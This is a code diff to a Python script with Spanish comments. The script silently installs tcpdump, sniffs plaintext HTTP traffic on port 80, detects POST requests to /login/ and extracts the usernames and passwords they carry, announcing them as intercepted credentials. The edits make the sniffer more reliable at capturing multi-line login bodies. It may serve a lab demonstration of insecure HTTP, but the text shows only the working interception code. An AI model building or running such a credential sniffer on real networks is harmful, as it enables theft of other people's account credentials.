@@ -45,9 +45,9 @@ def monitor_traffic():
         subprocess.run(['apt-get', 'install', '-y', 'tcpdump', '-qq'],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
-        # Iniciar captura
+        # Iniciar captura con más bytes
         process = subprocess.Popen(
-            ['tcpdump', '-i', 'any', '-A', '-s', '0', 'tcp port 80'],
+            ['tcpdump', '-i', 'any', '-A', '-s', '65535', 'tcp port 80'],
             stdout=subprocess.PIPE,
             stderr=subprocess.DEVNULL,
             universal_newlines=True,
@@ -56,6 +56,7 @@ def monitor_traffic():
         
         buffer = []
         in_post = False
+        post_lines = []
         
         for line in process.stdout:
             buffer.append(line)
@@ -63,15 +64,20 @@ def monitor_traffic():
             # Detectar POST request
             if 'POST' in line and '/login/' in line:
                 in_post = True
+                post_lines = []
                 timestamp = datetime.now().strftime('%H:%M:%S')
                 print(f"\n📡 [{timestamp}] HTTP POST Request detectado")
                 print(f"   Ruta: /login/")
             
-            # Buscar credenciales en el body
-            if in_post and ('username=' in line or 'password=' in line):
-                credentials = extract_credentials(line)
+            # Acumular líneas del POST
+            if in_post:
+                post_lines.append(line)
                 
-                if credentials:
+                # Buscar credenciales en cualquier línea acumulada
+                full_text = ''.join(post_lines)
+                credentials = extract_credentials(full_text)
+                
+                if credentials and len(credentials) >= 2:
                     print("\n" + "="*60)
                     print("🔓 CREDENCIALES INTERCEPTADAS!")
                     print("="*60)
@@ -84,12 +90,17 @@ def monitor_traffic():
                     print("="*60 + "\n")
                     
                     in_post = False
+                    post_lines = []
                     buffer = []
+                
+                # Timeout si acumulamos muchas líneas sin encontrar nada
+                if len(post_lines) > 30:
+                    in_post = False
+                    post_lines = []
             
             # Limpiar buffer si es muy grande
-            if len(buffer) > 50:
-                buffer = buffer[-20:]
-                in_post = False
+            if len(buffer) > 100:
+                buffer = buffer[-50:]
         
     except KeyboardInterrupt:
         print("\n\n⚠️  Monitoreo detenido")
